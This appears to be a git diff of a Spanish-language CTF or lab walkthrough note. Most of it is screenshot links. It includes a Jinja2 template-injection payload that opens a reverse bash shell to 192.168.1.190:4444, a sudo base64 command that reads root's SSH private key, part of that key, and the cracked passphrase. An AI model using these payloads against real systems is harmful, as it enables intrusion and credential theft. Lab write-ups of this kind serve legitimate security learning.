@@ -3,14 +3,19 @@
 ---
 
 ![Pasted image 20250202143325](../../Fotos/Pasted%20image%2020250202143325.png)
-![Pasted image 20250202143305](../../Fotos/Pasted%20image%2020250202143305.png)![Pasted image 20250202143346](../../Fotos/Pasted%20image%2020250202143346.png)
+
+![Pasted image 20250202143305](../../Fotos/Pasted%20image%2020250202143305.png)
+
+![Pasted image 20250202143346](../../Fotos/Pasted%20image%2020250202143346.png)
 
 ![Pasted image 20250202143539](../../Fotos/Pasted%20image%2020250202143539.png)
 
 ![Pasted image 20250202144558](../../Fotos/Pasted%20image%2020250202144558.png)
+
 - /homeverde:/bin/bash 
 
 `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/192.168.1.190/4444 0>&1'").read() }}`
+
 ![Pasted image 20250202145046](../../Fotos/Pasted%20image%2020250202145046.png)
 
 ![Pasted image 20250202145216](../../Fotos/Pasted%20image%2020250202145216.png)
@@ -18,7 +23,9 @@
 ![Pasted image 20250202145247](../../Fotos/Pasted%20image%2020250202145247.png)
 
 `sudo base64 /root/.ssh/id_rsa | base64 -d`
+
 ![Pasted image 20250202145918](../../Fotos/Pasted%20image%2020250202145918.png)
+
 
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -76,6 +83,7 @@ vEACJSQrQKz9mWnewtRP5pzZk=
 Nos pide clave la id_rsa por lo que pasaremos a crackearla 
 
 ![Pasted image 20250202151203](../../Fotos/Pasted%20image%2020250202151203.png)
+
 - honda1
 
 ![Pasted image 20250202151234](../../Fotos/Pasted%20image%2020250202151234.png)
